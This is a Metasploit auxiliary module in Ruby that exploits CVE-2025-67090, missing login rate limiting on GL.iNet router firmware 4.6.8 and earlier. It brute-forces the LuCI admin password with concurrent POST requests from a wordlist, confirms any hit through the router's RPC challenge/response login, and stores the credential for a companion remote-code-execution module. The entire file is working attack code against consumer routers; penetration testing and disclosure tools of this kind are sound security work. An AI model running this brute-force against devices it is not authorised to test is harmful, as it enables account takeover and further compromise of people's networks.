##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GL.iNet Router LuCI Login Brute-Force',
        'Description' => %q{
          This module exploits CVE-2025-67090, a lack of rate limiting on the LuCI
          web interface of GL.iNet routers running firmware <= 4.6.8, to brute-force
          admin credentials.

          Passwords are tested concurrently against POST /cgi-bin/luci. A 302
          redirect indicates a valid credential. On success the module optionally
          verifies the credential against the RPC challenge/response API and stores
          it for use with the companion exploit module glinet_rce.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Aleksa Zatezalo' # Discovery and Metasploit module
        ],
        'References' => [
          ['CVE', '2025-67090'],
          ['CWE', '307'],
          ['URL', 'https://www.gl-inet.com/security/']
        ],
        'DisclosureDate' => '2025-11-16',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('USERNAME', [true, 'Admin username', 'root']),
      OptPath.new('PASS_FILE', [true, 'Path to password wordlist' ]),
      OptInt.new('CONCURRENCY', [true, 'Number of concurrent login attempts', 10 ]),
      OptBool.new('VERIFY_RPC', [true, 'Verify found credentials via RPC API', true ])
    ])
  end

  # ===========================================================================
  # Wordlist Loading
  # ===========================================================================

  def load_passwords(path)
    File.readlines(path, chomp: true).reject(&:empty?)
  rescue Errno::ENOENT
    fail_with(Failure::BadConfig, "Wordlist not found: #{path}")
  end

  # ===========================================================================
  # LuCI Brute-Force (CVE-2025-67090)
  # ===========================================================================

  # Test a single username/password pair against /cgi-bin/luci.
  # Returns the password on a 302 redirect (successful login), nil otherwise.
  def try_luci_login(username, password)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/cgi-bin/luci',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'luci_username' => username,
        'luci_password' => password
      }
    }, 10)

    res&.code == 302 ? password : nil
  end

  # Spray passwords concurrently using a thread pool. Returns the first valid
  # password found, or nil if the wordlist is exhausted.
  def brute_force(username, passwords)
    found = nil
    mutex = Mutex.new
    queue = Queue.new
    workers = []

    passwords.each { |p| queue << p }
    concurrency = [datastore['CONCURRENCY'], passwords.length].min

    concurrency.times do
      workers << Thread.new do
        until queue.empty? || mutex.synchronize { found }
          password = begin
            queue.pop(true)
          rescue ThreadError
            break
          end

          result = try_luci_login(username, password)

          if result
            mutex.synchronize { found = result }
            break
          end

          vprint_status("Tried #{username}:#{password} — failed")
        end
      end
    end

    workers.each(&:join)
    found
  end

  # ===========================================================================
  # RPC Verification
  # ===========================================================================

  def get_challenge(username)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/rpc',
      'ctype' => 'application/json',
      'data' => {
        'jsonrpc' => '2.0',
        'id' => 1,
        'method' => 'challenge',
        'params' => { 'username' => username }
      }.to_json
    })

    return nil unless res&.code == 200

    res.get_json_document['result']
  end

  def compute_auth_hash(username, password, challenge)
    salt = challenge['salt']
    nonce = challenge['nonce']
    alg = challenge['alg']

    pw_hash = case alg
              when 1 then UnixCrypt::MD5.build(password, salt)
              when 5 then UnixCrypt::SHA256.build(password, salt)
              when 6 then UnixCrypt::SHA512.build(password, salt)
              else
                fail_with(Failure::Unknown, "Unsupported hash algorithm: #{alg}")
              end

    Digest::MD5.hexdigest("#{username}:#{pw_hash}:#{nonce}")
  end

  def verify_rpc(username, password)
    challenge = get_challenge(username)
    return nil unless challenge

    auth_hash = compute_auth_hash(username, password, challenge)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/rpc',
      'ctype' => 'application/json',
      'data' => {
        'jsonrpc' => '2.0',
        'id' => 2,
        'method' => 'login',
        'params' => { 'username' => username, 'hash' => auth_hash }
      }.to_json
    })

    return nil unless res&.code == 200

    res.get_json_document.dig('result', 'sid')
  end

  # ===========================================================================
  # Scanner Entry Point
  # ===========================================================================

  def run_host(_ip)
    username = datastore['USERNAME']
    passwords = load_passwords(datastore['PASS_FILE'])

    print_status("Loaded #{passwords.length} passwords")
    print_status("Brute-forcing #{username} with concurrency=#{datastore['CONCURRENCY']}")

    password = brute_force(username, passwords)

    unless password
      print_error('No valid password found')
      return
    end

    print_good("Valid credential: #{username}:#{password}")

    if datastore['VERIFY_RPC']
      sid = verify_rpc(username, password)
      if sid
        print_good("RPC login confirmed (sid: #{sid[0..7]}...)")
      else
        print_warning('LuCI credential valid but RPC verification failed')
      end
    end

    store_valid_credential(
      user: username,
      private: password,
      private_type: :password
    )
  end
end
